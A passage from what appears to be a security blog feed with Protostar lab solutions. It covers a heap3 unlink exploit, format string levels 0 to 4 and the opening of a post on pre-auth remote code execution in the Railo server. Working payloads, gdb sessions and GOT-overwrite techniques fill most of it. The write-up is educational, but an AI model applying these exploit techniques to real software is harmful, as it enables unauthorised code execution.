<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define unlink(P, BK, FD)
</span><span class='line'>{
</span><span class='line'>  BK = P-&gt;bk;
</span><span class='line'>  FD = P-&gt;fd;
</span><span class='line'>  FD-&gt;bk = BK;
</span><span class='line'>  BK-&gt;fd = FD;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*(next-&gt;fd + 12) = next-&gt;bk
</span><span class='line'>*(next-&gt;bk + 8) = next-&gt;fd</span></code></pre></td></tr></table></div></figure>


<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') $(python -c 'print "B"*4 + "\xfc\xbf\x04\x08" + "B"*4') CCCC
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /opt/protostar/bin/heap3 $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') $(python -c 'print "B"*4 + "\xfc\xbf\x04\x08" + "B"*4') CCCC
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
</span><span class='line'>24  in heap3/heap3.c
</span><span class='line'>(gdb) ni 3
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
</span><span class='line'>3638    common/malloc.c: No such file or directory.
</span><span class='line'>in common/malloc.c
</span><span class='line'>(gdb) x/10wx 0x804c008-8
</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
</span><span class='line'>0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0x804c020:  0x41414141  0x41414141
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t --dynamic-relo ./heap3 | grep puts
</span><span class='line'>0804b128 R_386_JUMP_SLOT   puts</span></code></pre></td></tr></table></div></figure>


<p>and winner:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p winner
</span><span class='line'>$2 = {void (void)} 0x8048864 &lt;winner&gt;</span></code></pre></td></tr></table></div></figure>


<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r AAAA$(python -c 'print "A"*28 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>
</span><span class='line'>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c 'print "A"*28 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
</span><span class='line'>24  heap3/heap3.c: No such file or directory.
</span><span class='line'>    in heap3/heap3.c
</span><span class='line'>(gdb) x/i $eip
</span><span class='line'>0x8048935 &lt;main+172&gt;:   call   0x8048790 &lt;puts@plt&gt;
</span><span class='line'>(gdb) si
</span><span class='line'>0x08048790 in puts@plt ()
</span><span class='line'>(gdb) x/i $eip
</span><span class='line'>0x8048790 &lt;puts@plt&gt;:   jmp    DWORD PTR ds:0x804b128
</span><span class='line'>(gdb) ni
</span><span class='line'>0x0804c00c in ?? ()
</span><span class='line'>(gdb) x/wx $eip
</span><span class='line'>0x804c00c:  0x41414141
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>metasm &gt; push 0x08048864; ret
</span><span class='line'>"\x68\x64\x88\x04\x08\xc3"
</span><span class='line'>metasm &gt; </span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
</span><span class='line'>that wasn't too bad now, was it? @ 1411285668
</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
    <updated>2014-09-16T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>

<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>

<h2>Format String Level 00</h2>

<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
</span><span class='line'>Starting program: /opt/protostar/bin/format0 $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
</span><span class='line'>
</span><span class='line'>Breakpoint 1, vuln (string=0xbffff95f 'A' &lt;repeats 64 times&gt;, "ﾭ", &lt;incomplete sequence \336&gt;) at format0/format0.c:15
</span><span class='line'>15  in format0/format0.c
</span><span class='line'>(gdb) x/wx &target
</span><span class='line'>0xbffff75c: 0xdeadbeef
</span><span class='line'>(gdb) x/wx &target-4
</span><span class='line'>0xbffff74c: 0x41414141
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>you have hit the target correctly :)</span></code></pre></td></tr></table></div></figure>


<h2>Format String Level 01</h2>

<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
</span><span class='line'>08049638 g     O .bss   00000004              target
</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>


<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
</span><span class='line'>from commands import getoutput
</span><span class='line'>
</span><span class='line'>run = "/opt/protostar/bin/format1 $(perl -e 'print \"AAAAAAAA\" . \"%08x.\"x{0}' . \"%x\")"
</span><span class='line'>
</span><span class='line'>print '[!] Searching for offset..'
</span><span class='line'>for idx in range(1, 15000):
</span><span class='line'>    tmp = getoutput(run.format(idx))
</span><span class='line'>    tmps = tmp.split('.')[:-1]
</span><span class='line'>    if '41414141' in tmps[len(tmps)-1]:
</span><span class='line'>        print '[!] Format found at offset %d' % idx 
</span><span class='line'>        print '[!] String: %s' % run.format(idx)
</span><span class='line'>        break</span></code></pre></td></tr></table></div></figure>


<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ python ~/test.py
</span><span class='line'>[!] Searching for offset..
</span><span class='line'>[!] Format found at offset 133
</span><span class='line'>[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>


<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(perl -e 'print "\x38\x96\x04\x08BAAAA" . "%08x."x132 . "%n"')
</span><span class='line'>[snip]
</span><span class='line'>Breakpoint 1, vuln (
</span><span class='line'>                    string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
</span><span class='line'>12  format1/format1.c: No such file or directory.
</span><span class='line'>    in format1/format1.c
</span><span class='line'>    (gdb) x/wx &target
</span><span class='line'>    0x8049638 &lt;target&gt;: 0x000004ad
</span><span class='line'>    (gdb) c
</span><span class='line'>    Continuing.
</span><span class='line'>    1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>

<h2>Format String Level 02</h2>

<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t format2 | grep target
</span><span class='line'>080496e4 g     O .bss   00000004              target</span></code></pre></td></tr></table></div></figure>


<p>Modifying my script a bit (since input is now via fgets):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python /home/user/test.py 
</span><span class='line'>[!] Searching for offset..
</span><span class='line'>[!] Format found at offset 4
</span><span class='line'>[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2</span></code></pre></td></tr></table></div></figure>


<p>Not so far up the stack this time.  Lets plug in our address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
</span><span class='line'>��200.b7fd8420.bffff604.
</span><span class='line'>target is 26 :(</span></code></pre></td></tr></table></div></figure>


<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
</span><span class='line'>��                200.           b7fd8420.           bffff604.
</span><span class='line'>you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<h2>Format String Level 03</h2>

<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t format3 | grep target
</span><span class='line'>080496f4 g     O .bss   00000004              target</span></code></pre></td></tr></table></div></figure>


<p>And again running our script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python /home/user/test.py 
</span><span class='line'>[!] Searching for offset..
</span><span class='line'>[!] Format found at offset 12
</span><span class='line'>[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3</span></code></pre></td></tr></table></div></figure>


<p>And if we test this out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
</span><span class='line'>��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
</span><span class='line'>target is 0000004c :(</span></code></pre></td></tr></table></div></figure>


<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
</span><span class='line'>AAAAAA_41414141</span></code></pre></td></tr></table></div></figure>


<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
</span><span class='line'>AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
</span><span class='line'>target is 00000000 :(</span></code></pre></td></tr></table></div></figure>


<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
</span><span class='line'>��������
</span><span class='line'>target is 10101010 :(</span></code></pre></td></tr></table></div></figure>


<p>Figuring out the correct padding values requires some simple math:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>first byte = 0x44 - 0x10
</span><span class='line'>second     = 0x55 - 0x44
</span><span class='line'>third      = 0x02 - 0x55</span></code></pre></td></tr></table></div></figure>


<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
</span><span class='line'>��������                                                   080496f580496f680496f7
</span><span class='line'>target is 00000044 :(</span></code></pre></td></tr></table></div></figure>


<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
</span><span class='line'>��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
</span><span class='line'>you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>

<h2>Format String Level 04</h2>

<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -M intel -t format4 | grep hello
</span><span class='line'>080484b4 g     F .text  0000001e              hello</span></code></pre></td></tr></table></div></figure>


<p>And running our script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python /home/user/test.py 
</span><span class='line'>[!] Searching for offset..
</span><span class='line'>[!] Format found at offset 4
</span><span class='line'>[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4</span></code></pre></td></tr></table></div></figure>


<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump --dynamic-reloc format4 | grep exit
</span><span class='line'>08049718 R_386_JUMP_SLOT   _exit
</span><span class='line'>08049724 R_386_JUMP_SLOT   exit</span></code></pre></td></tr></table></div></figure>


<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "%4$n%5$n%6$n%7$n"' &gt; /tmp/input
</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./format4
</span><span class='line'>Reading symbols from /opt/protostar/bin/format4...done.
</span><span class='line'>(gdb) r &lt; /tmp/input
</span><span class='line'>Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
</span><span class='line'>$�%�&�'�
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x10101010 in ?? ()
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08" + "%4$hn"' &gt; /tmp/input
</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./format4
</span><span class='line'>Reading symbols from /opt/protostar/bin/format4...done.
</span><span class='line'>(gdb) r &lt; /tmp/input
</span><span class='line'>Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
</span><span class='line'>$�
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x08040004 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
</span><span class='line'>[snip whitespace]
</span><span class='line'>code execution redirected! you win</span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part four - pre-auth remote code execution]]></title>
    <link href="http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four/"/>
    <updated>2014-08-27T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four</id>
    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-auth rce</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three">Part three &ndash; pre-auth password retrieval</a></em><br/>
<em>Part four &ndash; pre-auth remote code execution</em></p>

<p>This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you&rsquo;ve skipped the first three parts of this blog post to get to the juicy stuff, I don&rsquo;t blame you, but I do recommend going back and reading them; there&rsquo;s some important information and details back there.  In this post, we&rsquo;ll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd&rsquo;s implementation on one of these.</p>

<p>The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file <code>thumbnail.cfm</code>, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.</p>

<p><code>thumbnail.cfm</code> first generates a hash of the image along with it&rsquo;s width and height:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset url.img=trim(url.img)&gt;
</span><span class='line'>&lt;cfset id=hash(url.img&"-"&url.width&"-"&url.height)&gt;
</span><span class='line'>&lt;cfset mimetypes={png:'png',gif:'gif',jpg:'jpeg'}&gt;</span></code></pre></td></tr></table></div></figure>


<p>Once it&rsquo;s got a hash, it checks if the file exists, and if not, attempts to read and write it down:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffile action="readbinary" file="#url.img#" variable="data"&gt;
</span><span class='line'>&lt;cfimage action="read" source="#data#" name="img"&gt;
</span><span class='line'>
</span><span class='line'>&lt;!--- shrink images if needed ---&gt;
</span><span class='line'>&lt;cfif img.height GT url.height or img.width GT url.width&gt;
</span><span class='line'>    &lt;cfif img.height GT url.height &gt;
</span><span class='line'>        &lt;cfimage action="resize" source="#img#" height="#url.height#" name="img"&gt;
